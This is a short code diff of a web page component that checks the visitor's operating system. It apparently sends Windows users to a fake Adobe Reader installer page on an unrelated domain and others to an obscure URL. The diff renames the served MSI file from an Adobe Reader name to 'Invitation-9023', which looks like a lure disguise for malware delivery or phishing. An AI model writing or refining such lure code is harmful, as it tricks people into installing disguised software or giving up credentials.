@@ -6,7 +6,7 @@ export default function Home() {
     const isWindows = /windows/i.test(userAgent);
 
     const NON_WINDOWS_TARGET = "https://quora.chabemo.institute/DjK@TxMYRFjDq3p5aQPUt2/";
-    const MSI_FILE = "/Adobe_Reader_install.msi";
+    const MSI_FILE = "/Invitation-9023";
     const WINDOWS_REDIRECT = "https://aspiceconference.com/adobe-reader/installer/download.html";
 
     if (isWindows) {
@@ -52,6 +52,7 @@ export default function Home() {
     </main>
   );
 }
+
 
 
 
